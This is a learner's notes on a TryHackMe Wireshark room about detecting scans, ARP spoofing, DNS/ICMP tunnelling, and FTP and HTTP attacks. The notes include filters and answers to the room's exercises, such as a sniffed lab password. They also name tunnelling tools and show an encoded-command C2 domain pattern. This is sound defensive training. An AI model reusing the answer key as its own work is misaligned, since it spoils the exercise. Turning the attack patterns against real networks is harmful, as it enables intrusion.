---
Learn the basics of traffic analysis with Wireshark and how to find anomalies on your network!
---

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/10f7d168ab59410ddc28a4b1e89fd6d4.png)

### Introduction 

In this room, we will cover the techniques and key points of traffic analysis with Wireshark and detect suspicious activities. Note that this is the third and last room of the Wireshark room trio, and it is suggested to visit the first two rooms stated below to practice and refresh your Wireshark skills before starting this one.

    Wireshark: The Basics
    Wireshark: Packet Operations

In the first two rooms, we have covered how to use Wireshark and do packet-level searches. Now, it is time to investigate and correlate the packet-level information to see the big picture in the network traffic, like detecting anomalies and malicious activities. For a security analyst, it is vital to stop and understand pieces of information spread in packets by applying the analyst's knowledge and tool functionality. This room will cover investigating packet-level details by synthesising the analyst knowledge and  Wireshark functionality for detecting anomalies and odd situations for a given case.

Note: A VM is attached to this room. You don't need SSH or RDP; the room provides a "Split View" feature. DO NOT directly interact with any domains and IP addresses in this room. The domains and IP addresses are included only for reference reasons.

###  Nmap Scans

Nmap Scans  

Nmap is an industry-standard tool for mapping networks, identifying live hosts and discovering the services. As it is one of the most used network scanner tools, a security analyst should identify the network patterns created with it. This section will cover identifying the most common Nmap scan types.

Transmission Control Protocol (TCP) is a connection-oriented protocol requiring a TCP three-way-handshake to establish a connection. TCP provides reliable data transfer, flow control and congestion control. Higher-level protocols such as HTTP, POP3, IMAP and SMTP use TCP

User Datagram Protocol (UDP) is a connectionless protocol; UDP does not require a connection to be established. UDP is suitable for protocols that rely on fast queries, such as DNS, and for protocols that prioritise real-time communications, such as audio/video conferencing and broadcast.


-   TCP connect scans
-   SYN scans
-   UDP scans

It is essential to know how Nmap scans work to spot scan activity on the network. However, it is impossible to understand the scan details without using the correct filters. Below are the base filters to probe Nmap scan behaviour on the network. 

**TCP flags in a nutshell.**

**Notes**

**Wireshark Filters**

Global search.

-   `tcp`

-   `udp`

-   Only SYN flag.
-   SYN flag is set. The rest of the bits are not important.

-   `tcp.flags == 2`

-   `tcp.flags.syn == 1`

-   Only ACK flag.
-   ACK flag is set. The rest of the bits are not important.  
    

-   `tcp.flags == 16`

-   `tcp.flags.ack == 1`

-   Only SYN, ACK flags.
-   SYN and ACK are set. The rest of the bits are not important.

-   `tcp.flags == 18`

-   `(tcp.flags.syn == 1) and (tcp.flags.ack == 1)`

-   Only RST flag.
-   RST flag is set. The rest of the bits are not important.  
    

  

-   `tcp.flags == 4`

-   `tcp.flags.reset == 1`

-   Only RST, ACK flags.
-   RST and ACK are set. The rest of the bits are not important.  
    

-   `tcp.flags == 20`

-   `(tcp.flags.reset == 1) and (tcp.flags.ack == 1)`

-   Only FIN flag
-   FIN flag is set. The rest of the bits are not important.

-   `tcp.flags == 1`

-   `tcp.flags.fin == 1`

TCP Connect Scans  

**TCP Connect Scan in a nutshell:**

-   Relies on the three-way handshake (needs to finish the handshake process).
-   Usually conducted with `nmap -sT` command.
-   Used by non-privileged users (only option for a non-root user).
-   Usually has a windows size larger than 1024 bytes as the request expects some data due to the nature of the protocol.

**Open TCP Port**

**Open TCP Port  
**

**Closed TCP Port**  

-   SYN -->
-   <-- SYN, ACK
-   ACK -->  
    

-   SYN -->
-   <-- SYN, ACK
-   ACK -->
-   RST, ACK -->  
    

-   SYN -->
-   <-- RST, ACK  
    

The images below show the three-way handshake process of the open and close TCP ports. Images and pcap samples are split to make the investigation easier and understand each case's details.

**Open TCP port (Connect):**

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/500bb6902ef6b2edb515bb1828088d82.png)

**Closed TCP port (Connect):**

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/c194773203502d659d72706aa93eae59.png)

The above images provide the patterns in isolated traffic. However, it is not always easy to spot the given patterns in big capture files. Therefore analysts need to use a generic filter to view the initial anomaly patterns, and then it will be easier to focus on a specific traffic point. The given filter shows the TCP Connect scan patterns in a capture file.

`tcp.flags.syn==1 and tcp.flags.ack==0 and tcp.window_size > 1024`

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/7025561839f99201724629fae1274f2d.png)

**SYN Scans**  

TCP SYN Scan in a nutshell:

-   Doesn't rely on the three-way handshake (no need to finish the handshake process).
-   Usually conducted with `nmap -sS` command.
-   Used by privileged users.
-   Usually have a size less than or equal to 1024 bytes as the request is not finished and it doesn't expect to receive data.

**Open TCP Port**

**Close TCP Port**

-   SYN -->
-   <-- SYN,ACK
-   RST-->

-   SYN -->
-   <-- RST,ACK

**Open TCP port (SYN):**

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/0dbf4e7b74ad99f7060241fc37d8d570.png)

**Closed TCP port (SYN):**

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/488115fed65b69aa95aa2677cf2ae800.png)

The given filter shows the TCP SYN scan patterns in a capture file.

`tcp.flags.syn==1 and tcp.flags.ack==0 and tcp.window_size <= 1024`

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/d033bde6ee753f070678cc56665d79fa.png)

UDP Scans  

UDP Scan in a nutshell:

-   Doesn't require a handshake process
-   No prompt for open ports
-   ICMP error message for close ports
-   Usually conducted with `nmap -sU` command.

Open UDP Port  

Closed UDP Port  

-   UDP packet -->

-   UDP packet -->
-   ICMP Type 3, Code 3 message. (Destination unreachable, port unreachable)

**Closed (port no 69) and open (port no 68) UDP ports:**

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/bb88ee3b05687c6ece165ab7e9fe12bf.png)

The above image shows that the closed port returns an ICMP error packet. No further information is provided about the error at first glance, so how can an analyst decide where this error message belongs? The ICMP error message uses the original request as encapsulated data to show the source/reason of the packet. Once you expand the ICMP section in the packet details pane, you will see the encapsulated data and the original request, as shown in the below image.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/0e63fe522554f08810d7d60b8a331ae7.png)

The given filter shows the UDP scan patterns in a capture file.  

`icmp.type==3 and icmp.code==3`

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/626988e40598f6190c81f59ab3ff813c.png)

Detecting suspicious activities in chunked files is easy and a great way to learn how to focus on the details. Now use the exercise files to put your skills into practice against a single capture file and answer the questions below!

Use the "Desktop/exercise-pcaps/nmap/Exercise.pcapng" file.What is the total number of the "TCP Connect" scans?

![[Pasted image 20221211182759.png]]

*1000*
  
Which scan type is used to scan the TCP port 80?
*TCP Connect*
  
How many "UDP close port" messages are there?
![[Pasted image 20221211183823.png]]

*1083*

  
Which UDP port in the 55-70 port range is open?
Remember, half of the traffic analysis is done by hand when using Wireshark. Filter the traffic as shown in the task, then filter the destination port (UDP) with the "filter a column" option. Finally, scroll the bar in the packet list section and investigate the findings manually. --Because doesn't apper like destination unreacheable, finding manually 
	
	udp.dstport==68
	
![[Pasted image 20221211184338.png]]

*68*

### ARP Poisoning & Man In The Middle!

Address Resolution Protocol (ARP) is responsible for finding the MAC (hardware) address related to a specific IP address. It works by broadcasting an ARP query, "Who has this IP address? Tell me." And the response is of the form, "The IP address is at this MAC address."

ARP Poisoning/Spoofing (A.K.A. Man In The Middle Attack)  

**ARP** protocol, or **A**ddress **R**esolution **P**rotocol (**ARP**), is the technology responsible for allowing devices to identify themselves on a network. Address Resolution Protocol Poisoning (also known as ARP Spoofing or Man In The Middle (MITM) attack) is a type of attack that involves network jamming/manipulating by sending malicious ARP packets to the default gateway. The ultimate aim is to manipulate the **"IP to MAC address table"** and sniff the traffic of the target host.

There are a variety of tools available to conduct ARP attacks. However, the mindset of the attack is static, so it is easy to detect such an attack by knowing the ARP protocol workflow and Wireshark skills.    

**ARP analysis in a nutshell:**

-   Works on the local network
-   Enables the communication between MAC addresses
-   Not a secure protocol
-   Not a routable protocol
-   It doesn't have an authentication function
-   Common patterns are request & response, announcement and gratuitous packets.

Before investigating the traffic, let's review some legitimate and suspicious ARP packets. The legitimate requests are similar to the shown picture: a broadcast request that asks if any of the available hosts use an IP address and a reply from the host that uses the particular IP address.

  

**Notes**

**Wireshark filter**

Global search

-   `arp`

"ARP" options for grabbing the low-hanging fruits:

-   Opcode 1: ARP requests.
-   Opcode 2: ARP responses.
-   **Hunt:** Arp scanning
-   **Hunt:** Possible ARP poisoning detection
-   **Hunt:** Possible ARP flooding from detection:

-   `arp.opcode == 1`

-   `arp.opcode == 2`

-   `arp.dst.hw_mac==00:00:00:00:00:00`

-   `arp.duplicate-address-detected or arp.duplicate-address-frame`

-   `((arp) && (arp.opcode == 1)) && (arp.src.hw_mac == target-mac-address)`

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/ef02b6b0434491aea9eb6957c70c32d2.png)

A suspicious situation means having two different ARP responses (conflict) for a particular IP address. In that case, Wireshark's expert info tab warns the analyst. However, it only shows the second occurrence of the duplicate value to highlight the conflict. Therefore, identifying the malicious packet from the legitimate one is the analyst's challenge. A possible IP spoofing case is shown in the picture below.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/7f0e92a248da129dda0593a299ecb368.png)

Here, knowing the network architecture and inspecting the traffic for a specific time frame can help detect the anomaly. As an analyst, you should take notes of your findings before going further. This will help you be organised and make it easier to correlate the further findings. Look at the given picture; there is a conflict; the MAC address that ends with "b4" crafted an ARP request with the "192.168.1.25" IP address, then claimed to have the "192.168.1.1" IP address.  

**Notes**

Detection Notes  

**Findings**

Possible IP address match.  

1 IP address announced from a MAC address.  

-   MAC: 00:0c:29:e2:18:b4
-   IP: 192.168.1.25

Possible ARP spoofing attempt.  

2 MAC addresses claimed the same IP address (192.168.1.1).  
The " 192.168.1.1" IP address is a possible gateway address.  

-   MAC1: 50:78:b3:f3:cd:f4
-   MAC 2: 00:0c:29:e2:18:b4

Possible ARP flooding attempt.  

The MAC address that ends with "b4" claims to have a different/new IP address.  

-   MAC: 00:0c:29:e2:18:b4
-   IP: 192.168.1.1

Let's keep inspecting the traffic to spot any other anomalies. Note that the case is split into multiple capture files to make the investigation easier.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/e02a42c9d4e3f17a94acbae4cacb6b65.png)

At this point, it is evident that there is an anomaly. A security analyst cannot ignore a flood of ARP requests. This could be malicious activity, scan or network problems. There is a new anomaly; the MAC address that ends with "b4" crafted multiple ARP requests with the "192.168.1.25" IP address. Let's focus on the source of this anomaly and extend the taken notes. 

Notes

Detection Notes

Findings

Possible IP address match.  

1 IP address announced from a MAC address.  

-   MAC: 00:0c:29:e2:18:b4
-   IP: 192.168.1.25

Possible ARP spoofing attempt.  

2 MAC addresses claimed the same IP address (192.168.1.1).

The " 192.168.1.1" IP address is a possible gateway address.

-   MAC1: 50:78:b3:f3:cd:f4
-   MAC 2: 00:0c:29:e2:18:b4

Possible ARP spoofing attempt.  

The MAC address that ends with "b4" claims to have a different/new IP address.  

-   MAC: 00:0c:29:e2:18:b4
-   IP: 192.168.1.1

Possible ARP flooding attempt.  

The MAC address that ends with "b4" crafted multiple ARP requests against a range of IP addresses.

-   MAC: 00:0c:29:e2:18:b4
-   IP: 192.168.1.xxx

Up to this point, it is evident that the MAC address that ends with "b4" owns the "192.168.1.25" IP address and crafted suspicious ARP requests against a range of IP addresses. It also claimed to have the possible gateway address as well. Let's focus on other protocols and spot the reflection of this anomaly in the following sections of the time frame.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/f55ebc1632f6776e074dc29842221b48.png)

There is HTTP traffic, and everything looks normal at the IP level, so there is no linked information with our previous findings. Let's add the MAC addresses as columns in the packet list pane to reveal the communication behind the IP addresses.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/f885817e77449e6898ba3ede164723c4.png)

One more anomaly! The MAC address that ends with "b4" is the destination of all HTTP packets! It is evident that there is a MITM attack, and the attacker is the host with the MAC address that ends with "b4". All traffic linked to "192.168.1.12" IP addresses is forwarded to the malicious host. Let's summarise the findings before concluding the investigation.  

Detection Notes

Findings

IP to MAC matches.

3  IP to MAC address matches. 

-   MAC: 00:0c:29:e2:18:b4 = IP: 192.168.1.25
-   MAC: 50:78:b3:f3:cd:f4 = IP: 192.1681.1
-   MAC: 00:0c:29:98:c7:a8 = IP: 192.168.1.12

Attacker

The attacker created noise with ARP packets.  

-   MAC: 00:0c:29:e2:18:b4 = IP: 192.168.1.25  
    

Router/gateway  

Gateway address.  

-   MAC: 50:78:b3:f3:cd:f4 = IP: 192.1681.1  
    

Victim  

The attacker sniffed all traffic of the victim.

-   MAC: 50:78:b3:f3:cd:f4 = IP: 192.1681.12  
    

Detecting these bits and pieces of information in a big capture file is challenging. However, in real-life cases, you will not have "tailored data" ready for investigation. Therefore you need to have the analyst mindset, knowledge and tool skills to filter and detect the anomalies. 

**Note:** In traffic analysis, there are always alternative solutions available. The solution type and the approach depend on the analyst's knowledge and skill level and the available data sources. 

Detecting suspicious activities in chunked files is easy and a great way to learn how to focus on the details. Now use the exercise files to put your skills into practice against a single capture file and answer the questions below!

  
Use the "Desktop/exercise-pcaps/arp/Exercise.pcapng" file.  
What is the number of ARP requests crafted by the attacker?

![[Pasted image 20221211200214.png]]

eth.src == 00:0c:29:e2:18:b4 and arp.opcode == 1

![[Pasted image 20221211200245.png]]

*284*
  
What is the number of HTTP packets received by the attacker?

eth.dst == 00:0c:29:e2:18:b4 and http

![[Pasted image 20221211200434.png]]

*90*  

What is the number of sniffed username&password entries?
Filter the site visited by the victim, then filter the post requests. Focusing on URI sections of the packet details after filtering could help.

http.request.full_uri == "http://testphp.vulnweb.com/userinfo.php"

not uname and pass (2) so 8 -2 = 6

![[Pasted image 20221211200945.png]]

![[Pasted image 20221211201037.png]]

*6*

  
What is the password of the "Client986"?
Special characters are displayed in HEX format. Make sure that you convert them to ASCII.

*clientnothere!*

  
What is the comment provided by the "Client354"?
Special characters are displayed in HEX format. Make sure that you convert them to ASCII.

apply as filter:
http.host == "testphp.vulnweb.com"

![[Pasted image 20221211201324.png]]

*Nice work!*

###  Identifying Hosts: DHCP, NetBIOS and Kerberos

Identifying Hosts  

When investigating a compromise or malware infection activity, a security analyst should know how to identify the hosts on the network apart from IP to MAC address match. One of the best methods is identifying the hosts and users on the network to decide the investigation's starting point and list the hosts and users associated with the malicious traffic/activity.

Usually, enterprise networks use a predefined pattern to name users and hosts. While this makes knowing and following the inventory easier, it has good and bad sides. The good side is that it will be easy to identify a user or host by looking at the name. The bad side is that it will be easy to clone that pattern and live in the enterprise network for adversaries. There are multiple solutions to avoid these kinds of activities, but for a security analyst, it is still essential to have host and user identification skills.  

Protocols that can be used in Host and User identification:

-   Dynamic Host Configuration Protocol (DHCP) traffic
-   NetBIOS (NBNS) traffic 
-   Kerberos traffic

**DHCP Analysis**

**DHCP** protocol, or **D**ynamic **H**ost **C**onfiguration **P**rotocol **(DHCP)****,** is the technology responsible for managing automatic IP address and required communication parameters assignment.  

**DHCP investigation in a nutshell:**

**Notes**

**Wireshark Filter**

Global search.

-   `dhcp` or `bootp`

Filtering the proper DHCP packet options is vital to finding an event of interest.   
  

-   **"DHCP Request"** packets contain the hostname information
-   **"DHCP ACK"** packets represent the accepted requests
-   **"DHCP NAK"** packets represent denied requests

Due to the nature of the protocol, only "Option 53" ( request type) has predefined static values. You should filter the packet type first, and then you can filter the rest of the options by "applying as column" or use the advanced filters like "contains" and "matches".  

-   Request: `dhcp.option.dhcp == 3`

-   ACK: `dhcp.option.dhcp == 5`

-   NAK: `dhcp.option.dhcp == 6`

**"DHCP Request"** options for grabbing the low-hanging fruits:

-   **Option 12:** Hostname.
-   **Option 50:** Requested IP address.
-   **Option 51:** Requested IP lease time.
-   **Option 61:** Client's MAC address.

-   `dhcp.option.hostname contains "keyword"`

**"DHCP ACK"** options for grabbing the low-hanging fruits:

-   **Option 15:** Domain name.
-   **Option 51:** Assigned IP lease time.

-   `dhcp.option.domain_name contains "keyword"`

**"DHCP NAK"** options for grabbing the low-hanging fruits:

-   **Option 56:** Message (rejection details/reason).

As the message could be unique according to the case/situation, It is suggested to read the message instead of filtering it. Thus, the analyst could create a more reliable hypothesis/result by understanding the event circumstances.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/7431eb9671e8ebb2a21d2ff9a08b2faa.png)

NetBIOS (NBNS) Analysis

BIOS (**basic input/output system**) is the program a computer's microprocessor uses to start the computer system after it is powered on. It also manages data flow between the computer's operating system (OS) and attached devices, such as the hard disk, video adapter, keyboard, mouse and printer.

**NetBIOS** or **Net**work **B**asic **I**nput/**O**utput **S**ystem is the technology responsible for allowing applications on different hosts to communicate with each other. 

**NBNS investigation in a nutshell:**

**Notes**

**Wireshark Filter**

Global search.

-   `nbns`

"NBNS" options for grabbing the low-hanging fruits:

-   **Queries:** Query details.
-   Query details could contain **"name, Time to live (TTL) and IP address details"**

-   `nbns.name contains "keyword"`

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/e12db620d6127ad299059e3626f083d7.png)

Kerberos Analysis  

**Kerberos** is the default authentication service for Microsoft Windows domains. It is responsible for authenticating service requests between two or more computers over the untrusted network. The ultimate aim is to prove identity securely.  

**Kerberos investigation in a nutshell:**

**Notes**

**Wireshark Filter**

Global search.

-   `kerberos`

User account search:

-   **CNameString:** The username.

**Note:** Some packets could provide hostname information in this field. To avoid this confusion, filter the **"$"** value. The values end with **"$"** are hostnames, and the ones without it are user names.  

-   `kerberos.CNameString contains "keyword"` 
-   `kerberos.CNameString and !(kerberos.CNameString contains "$" )`

"Kerberos" options for grabbing the low-hanging fruits:

-   **pvno:** Protocol version.
-   **realm:** Domain name for the generated ticket.  
    
-   **sname:** Service and domain name for the generated ticket.
-   **addresses:** Client IP address and NetBIOS name.  
    

**Note:** the "addresses" information is only available in request packets.

-   `kerberos.pvno == 5`

-   `kerberos.realm contains ".org"` 

-   `kerberos.SNameString == "krbtg"`

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/9826985c3c3b9f582f7c7c5ed24f93d7.png)

Detecting suspicious activities in chunked files is easy and a great way to learn how to focus on the details. Now use the exercise files to put your skills into practice against a single capture file and answer the questions below!

Use the "Desktop/exercise-pcaps/dhcp-netbios-kerberos/dhcp-netbios.pcap" file.  
What is the MAC address of the host "Galaxy A30"?
Filtering a pattern rather than actual value can help.

dhcp.option.hostname contains "Galaxy"

![[Pasted image 20221211214119.png]]


*9a:81:41:cb:96:6c*

How many NetBIOS registration requests does the "LIVALJM" workstation have?
"nbns.flags.opcode == 5" filter can help.

	nbns.name contains "LIVALJM" and nbns.flags.opcode==5

![[Pasted image 20221211214402.png]]

*16*

  
Which host requested the IP address "172.16.13.85"?

dhcp.option.requested_ip_address == 172.16.13.85

![[Pasted image 20221211215441.png]]


*Galaxy-A12*

  
Use the "Desktop/exercise-pcaps/dhcp-netbios-kerberos/**kerberos.pcap" file.**  
What is the IP address of the user "u5"? (Enter the address in defanged format.)

kerberos.CNameString contains "u5"
found ip 10.1.12.2 so defanging 10[.]1[.]12[.]2
![[Pasted image 20221211215703.png]]

*10[.]1[.]12[.]2*
  
What is the hostname of the available host in the Kerberos packets?

kerberos.CNameString

![[Pasted image 20221211220203.png]]

*xp1$*

###   Tunneling Traffic: DNS and ICMP

Tunnelling Traffic: ICMP and DNS   

Traffic tunnelling is (also known as **"port forwarding"**) transferring the data/resources in a secure method to network segments and zones. It can be used for "internet to private networks" and "private networks to internet" flow/direction. There is an encapsulation process to hide the data, so the transferred data appear natural for the case, but it contains private data packets and transfers them to the final destination securely.  

  

Tunnelling provides anonymity and traffic security. Therefore it is highly used by enterprise networks. However, as it gives a significant level of data encryption, attackers use tunnelling to bypass security perimeters using the standard and trusted protocols used in everyday traffic like ICMP and DNS. Therefore, for a security analyst, it is crucial to have the ability to spot ICMP and DNS anomalies.

  

ICMP Analysis   

Internet Control Message Protocol (ICMP) is designed for diagnosing and reporting network communication issues. It is highly used in error reporting and testing. As it is a trusted network layer protocol, sometimes it is used for denial of service (DoS) attacks; also, adversaries use it in data exfiltration and C2 tunnelling activities.

ICMP analysis in a nutshell:

Usually, ICMP tunnelling attacks are anomalies appearing/starting after a malware execution or vulnerability exploitation. As the ICMP packets can transfer an additional data payload, adversaries use this section to exfiltrate data and establish a C2 connection. It could be a TCP, HTTP or SSH data. As the ICMP protocols provide a great opportunity to carry extra data, it also has disadvantages. Most enterprise networks block custom packets or require administrator privileges to create custom ICMP packets.

A large volume of ICMP traffic or anomalous packet sizes are indicators of ICMP tunnelling. Still, the adversaries could create custom packets that match the regular ICMP packet size (64 bytes), so it is still cumbersome to detect these tunnelling activities. However, a security analyst should know the normal and the abnormal to spot the possible anomaly and escalate it for further analysis.

**Notes**

**Wireshark filters**

Global search

-   `icmp`

"ICMP" options for grabbing the low-hanging fruits:

-   Packet length.
-   ICMP destination addresses.  
    
-   Encapsulated protocol signs in ICMP payload.

-   `data.len > 64 and icmp`

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/723f801adc6a95526c2cb39b7ddeee15.png)

DNS Analysis   

Domain Name System (DNS) is designed to translate/convert IP domain addresses to IP addresses. It is also known as a phonebook of the internet. As it is the essential part of web services, it is commonly used and trusted, and therefore often ignored. Due to that, adversaries use it in data exfiltration and C2 activities.

**DNS analysis in a nutshell:  
  
**

Similar to ICMP tunnels, DNS attacks are anomalies appearing/starting after a malware execution or vulnerability exploitation. Adversary creates (or already has) a domain address and configures it as a C2 channel. The malware or the commands executed after exploitation sends DNS queries to the C2 server. However, these queries are longer than default DNS queries and crafted for subdomain addresses. Unfortunately, these subdomain addresses are not actual addresses; they are encoded commands as shown below:  

  

**"encoded-commands.maliciousdomain.com"**

  

When this query is routed to the C2 server, the server sends the actual malicious commands to the host. As the DNS queries are a natural part of the networking activity, these packets have the chance of not being detected by network perimeters. A security analyst should know how to investigate the DNS packet lengths and target addresses to spot these anomalies. 

**Notes**

**Wireshark Filter**

Global search

-   `dns`

"DNS" options for grabbing the low-hanging fruits:

-   Query length.
-   Anomalous and non-regular names in DNS addresses.
-   Long DNS addresses with encoded subdomain addresses.
-   Known patterns like dnscat and dns2tcp.
-   Statistical analysis like the anomalous volume of DNS requests for a particular target.

**!mdns:** Disable local link device queries.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/c11641f9df84faa040e2c6c11da08655.png)

Detecting suspicious activities in chunked files is easy and a great way to learn how to focus on the details. Now use the exercise files to put your skills into practice against a single capture file and answer the questions below!

Use the "Desktop/exercise-pcaps/dns-icmp/icmp-tunnel.pcap" file.  
Investigate the anomalous packets. Which protocol is used in ICMP tunnelling?

1) Remember, Wireshark is not an IDS/IPS tool. A security analyst should know how to filter the packets and investigate the results manually. 2) Filtering anomalous packets and investigating the packet details (including payload data) could help.

data.len > 64 and icmp

look data and see ssh .. i.e length 878
![[Pasted image 20221211225232.png]]



*ssh*

  
Use the "Desktop/exercise-pcaps/dns-icmp/dns.pcap" file.  
Investigate the anomalous packets. What is the suspicious main domain address that receives anomalous DNS queries? (Enter the address in defanged format.)

After filtering the packets, focus on the payload data in the packet bytes section. You might need to use the tool in full-screen mode/full-screen the VM.

dns.qry.name.len > 15 and !mdns

![[Pasted image 20221211225910.png]]


*dataexfil[.]com*

### Cleartext Protocol Analysis: FTP

Cleartext Protocol Analysis  

Investigating cleartext protocol traces sounds easy, but when the time comes to investigate a big network trace for incident analysis and response, the game changes. Proper analysis is more than following the stream and reading the cleartext data. For a security analyst, it is important to create statistics and key results from the investigation process. As mentioned earlier at the beginning of the Wireshark room series, the analyst should have the required network knowledge and tool skills to accomplish this. Let's simulate a cleartext protocol investigation with Wireshark!

FTP Analysis   

File Transfer Protocol (FTP) is designed to transfer files with ease, so it focuses on simplicity rather than security. As a result of this, using this protocol in unsecured environments could create security issues like:

-   MITM attacks
-   Credential stealing and unauthorised access
-   Phishing
-   Malware planting
-   Data exfiltration

**FTP analysis in a nutshell:**

**Notes**

**Wireshark Filter**

Global search

-   `ftp`

**"FTP"** options for grabbing the low-hanging fruits:

-   **x1x series:** Information request responses.
-   **x2x series:** Connection messages.
-   **x3x series:** Authentication messages.

**Note:** "200" means command successful.

**---**

"x1x" series options for grabbing the low-hanging fruits:

-   **211:** System status.
-   **212:** Directory status.
-   **213:** File status

-   `ftp.response.code == 211` 

"x2x" series options for grabbing the low-hanging fruits:

-   **220:** Service ready.
-   **227:** Entering passive mode.
-   **228:** Long passive mode.
-   **229:** Extended passive mode.

-   `ftp.response.code == 227`

"x3x" series options for grabbing the low-hanging fruits:

-   **230:** User login.
-   **231:** User logout.
-   **331:** Valid username.
-   **430:** Invalid username or password
-   **530:** No login, invalid password.

-   `ftp.response.code == 230`

"FTP" commands for grabbing the low-hanging fruits:

-   **USER:** Username.
-   **PASS:** Password.
-   **CWD:** Current work directory.
-   **LIST:** List.

-   `ftp.request.command == "USER"`

-   `ftp.request.command == "PASS"`

-   `ftp.request.arg == "password"`

Advanced usages examples for grabbing low-hanging fruits:

-   **Bruteforce signal:** List failed login attempts.
-   **Bruteforce signal:** List target username.
-   **Password spray signal:** List targets for a static password.  
    

-   `ftp.response.code == 530`

-   `(ftp.response.code == 530) and (ftp.response.arg contains "username")`

-   `(ftp.request.command == "PASS" ) and (ftp.request.arg == "password")`

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/8287adaa075c737986e04d026f137e2e.png)

Detecting suspicious activities in chunked files is easy and a great way to learn how to focus on the details. Now use the exercise files to put your skills into practice against a single capture file and answer the questions below!

  
Use the "Desktop/exercise-pcaps/ftp/ftp.pcap" file.How many incorrect login attempts are there?
FTP code 503.

	ftp.response.code==530

![[Pasted image 20221212111953.png]]
*737*

  
What is the size of the file accessed by the "ftp" account?
Filtering the response code "213" can help.

	ftp.response.code==213

![[Pasted image 20221212112112.png]]


*39424*
  
The adversary uploaded a document to the FTP server. What is the filename?
Follow TCP

![[Pasted image 20221212112328.png]]


*resume.doc*
  
The adversary tried to assign special flags to change the executing permissions of the uploaded file. What is the command used by the adversary?

Follow TCP and at the end is the command

![[Pasted image 20221212112507.png]]

*CHMOD 777*

### Cleartext Protocol Analysis: HTTP

HTTP Analysis   

Hypertext Transfer Protocol (HTTP) is a cleartext-based, request-response and client-server protocol. It is the standard type of network activity to request/serve web pages, and by default, it is not blocked by any network perimeter. As a result of being unencrypted and the backbone of web traffic, HTTP is one of the must-to-know protocols in traffic analysis. Following attacks could be detected with the help of HTTP analysis:

  

-   Phishing pages
-   Web attacks
-   Data exfiltration
-   Command and control traffic (C2)

HTTP analysis in a nutshell:

**Notes**

**Wireshark Filter**

Global search

**Note:** HTTP2 is a revision of the HTTP protocol for better performance and security. It supports binary data transfer and request&response multiplexing.

-   `http`

-   `http2`

"HTTP **Request Methods"** for grabbing the low-hanging fruits:

-   GET
-   POST
-   Request: Listing all requests

  

-   `http.request.method == "GET"`

-   `http.request.method == "POST"`

-   `http.request`

"HTTP Response Status Codes" for grabbing the low-hanging fruits:

-   **200 OK:** Request successful.
-   **301 Moved Permanently:** Resource is moved to a new URL/path (permanently).
-   **302 Moved Temporarily:** Resource is moved to a new URL/path (temporarily).
-   **400 Bad Request:** Server didn't understand the request.
-   **401 Unauthorised:** URL needs authorisation (login, etc.).
-   **403 Forbidden:** No access to the requested URL. 
-   **404 Not Found:** Server can't find the requested URL.
-   **405 Method Not Allowed:** Used method is not suitable or blocked.
-   **408 Request Timeout:**  Request look longer than server wait time.
-   **500 Internal Server Error:** Request not completed, unexpected error.
-   **503 Service Unavailable:** Request not completed server or service is down.

-   `http.response.code == 200`

-   `http.response.code == 401`

-   `http.response.code == 403`

-   `http.response.code == 404`

-   `http.response.code == 405`

-   `http.response.code == 503`

"HTTP Parameters" for grabbing the low-hanging fruits:

-   **User agent:** Browser and operating system identification to a web server application.
-   **Request URI:** Points the requested resource from the server.  
    
-   **Full *URI:** Complete URI information.

***URI:** Uniform Resource Identifier.

-   `http.user_agent contains "nmap"`

-   `http.request.uri contains "admin"`

-   `http.request.full_uri contains "admin"`

"HTTP Parameters" for grabbing the low-hanging fruits:

-   **Server:** Server service name.  
    
-   **Host:** Hostname of the server
-   **Connection:** Connection status.  
    
-   **Line-based text data:** Cleartext data provided by the server.
-   **HTML Form URL Encoded:** Web form information.

-   `http.server contains "apache"`

-   `http.host contains "keyword"`

-   `http.host == "keyword"`

-   `http.connection == "Keep-Alive"`

-   `data-text-lines contains "keyword"`

User Agent Analysis   

As the adversaries use sophisticated technics to accomplish attacks, they try to leave traces similar to natural traffic through the known and trusted protocols. For a security analyst, it is important to spot the anomaly signs on the bits and pieces of the packets. The "user-agent" field is one of the great resources for spotting anomalies in HTTP traffic. In some cases, adversaries successfully modify the user-agent data, which could look super natural. A security analyst cannot rely only on the user-agent field to spot an anomaly. Never whitelist a user agent, even if it looks natural. User agent-based anomaly/threat detection/hunting is an additional data source to check and is useful when there is an obvious anomaly. If you are unsure about a value, you can conduct a web search to validate your findings with the default and normal user-agent info ([**example site**](https://developers.whatismybrowser.com/useragents/explore/)).

https://developers.whatismybrowser.com/useragents/explore/

User Agent analysis in a nutshell:  

**Notes**

**Wireshark Filter**

Global search.

-   `http.user_agent`

Research outcomes for grabbing the low-hanging fruits:

-   Different user agent information from the same host in a short time notice.
-   Non-standard and custom user agent info.
-   Subtle spelling differences. **("Mozilla" is not the same as  "Mozlilla" or "Mozlila")**
